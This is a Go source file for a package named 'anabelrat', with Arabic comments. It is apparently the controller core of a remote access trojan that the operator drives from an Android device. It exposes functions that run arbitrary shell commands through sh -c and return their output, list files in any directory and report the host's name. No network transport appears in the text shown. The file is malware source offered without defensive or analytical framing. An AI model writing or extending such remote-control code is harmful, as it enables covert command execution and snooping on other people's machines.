package anabelrat

import (
	"os"
	"os/exec"
	"strings"
)

// AnabelController هو الهيكل الرئيسي الذي ستتحكم به من الأندرويد
type AnabelController struct {
}

// NewAnabelController دالة لإنشاء كائن جديد (Constructor)
func NewAnabelController() *AnabelController {
	return &AnabelController{}
}

// ExecuteShell تنفيذ أوامر الشل وإعادة النتيجة كنص
func (a *AnabelController) ExecuteShell(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return "Error: " + err.Error()
	}
	return string(out)
}

// ListFiles عرض الملفات في مسار معين
func (a *AnabelController) ListFiles(path string) string {
	files, err := os.ReadDir(path)
	if err != nil {
		return "Error: " + err.Error()
	}

	var builder strings.Builder
	for _, file := range files {
		builder.WriteString(file.Name() + "\n")
	}
	return builder.String()
}

// GetDeviceInfo الحصول على معلومات النظام الأساسية
func (a *AnabelController) GetDeviceInfo() string {
	hostname, _ := os.Hostname()
	return "Device Hostname: " + hostname
}
